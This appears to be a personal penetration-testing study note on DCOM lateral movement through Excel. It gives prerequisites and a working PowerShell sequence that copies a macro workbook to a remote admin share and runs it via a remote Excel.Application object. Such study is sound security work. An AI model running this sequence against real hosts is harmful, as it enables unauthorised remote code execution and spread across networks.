---
title: DCOM
date: M02-18-2023
author: i4
---
- RPC over TCP (135/TCP)
- Allows lateral movement through the office suite.
- Needs local admin on the target machine

## Enumeration DCOM functionalities
- Allows the execution of VBA code remotely [[macros]]
- Save workbook as legacy (Excel 97-2003 Workbook) format
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.151.5"))
$com | gm 
> Run                                  Method                Variant Run (Variant, Variant, Variant, Variant, Variant,...
```

1. Copy the excel with macro to the remote computer (Can also be hosted on SMB)
	- `[System.IO.File]::Copy($local,$remote,$true)`
 2. Open the document through dcom
	- `$com.Workbooks.Open([path to the workbook])`
	- This will fail with an COMException since the SYSTEM account does not have a profile.
		- `[system.io.directory]::createDirectory("\\[server]\C$\Windows\sysWOW64\config\systemprofile\Desktop")`
 3. Execute macro
	- `$com.Run("macroname")`
### Full Attack
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "172.16.151.5"))
$LocalPath = "C:\Users\offsec.CLIENT251\Desktop\Book1.xls"
$RemotePath = "\\172.16.151.5\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\172.16.151.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("blah")
```